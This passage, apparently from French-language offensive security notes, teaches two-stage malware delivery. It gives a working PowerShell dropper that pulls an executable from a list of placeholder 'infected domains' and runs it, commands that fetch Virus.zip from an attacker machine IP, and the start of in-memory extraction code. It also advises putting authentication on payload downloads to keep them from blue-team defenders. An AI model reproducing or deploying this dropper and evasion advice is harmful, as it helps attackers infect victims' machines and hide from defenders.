
La plupart des malwares ne sont pas distribué en un seul fichier et fonctionne en 2 étages :

## __Dropper___

Afin **télécharger** et d'**éxecuter** le malware **en mémoire**, on va faire éxecuter un **dropper** qui va faire appel à un domaine infecté pour télécharger notre payload.

Notez qu'il est conseillé de mettre une authentification web au téléchargement dans le but d'éviter une collecte par des blueTeamers qui aurai vu passer le flux sans avoir accès au code du dropper.

### Exemple 1

Avec powershell ce code ressemblerai à cela :

```powershell
$wvh = new-object net.webclient;
$nsh='http://<InfectedDomain1>/trkldl@http://<InfectedDomain2>/adCa0ad@http://<InfectedDomain3>/bl4bl4c4r'.split("@");
$onj = '453';
$dxo=$env:temp+'\'+$onj+'.exe';
foreach($wzi in $nsh){
	try{
		$wvh.downloadfile($wzi, $dxo);
		if((get-item $dxo).length -ge 80000){
			invoke-item $dxo;
			break;
		}	
	}catch{}
}
```

Pour résumer ce payload va :
- **Creer un objet pour telecharger**
- **Faire une liste des liens où trouver le malware**
- **Télécharger** puis **executer** le premier fichier qui aura une taille > 80000

### Exemple 2

Windows 10 et + :

```powershell
Invoke-WebRequest -Uri 'http://<MACHINE_IP>:8000/Virus.zip' -outfile "virus.zip";
```

Windows 7 et - :

```powershell
# Creation d'un nouveau client web
$webClient = [System.Net.WebClient];

# Telechargement des donnes dans une variable
$zip = $webClient.DownloadData('http://<MachineIP>:8000/Virus.zip');
```


## __Extraction__

Une fois l'étape précédente effectué, le ZIP se trouve en mémoire dans la variable $zip. On doit donc les extraire en restant en mémoire.

```powershell
# Chargement de la bibliothèque System.IO.Compression
[System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Nu
```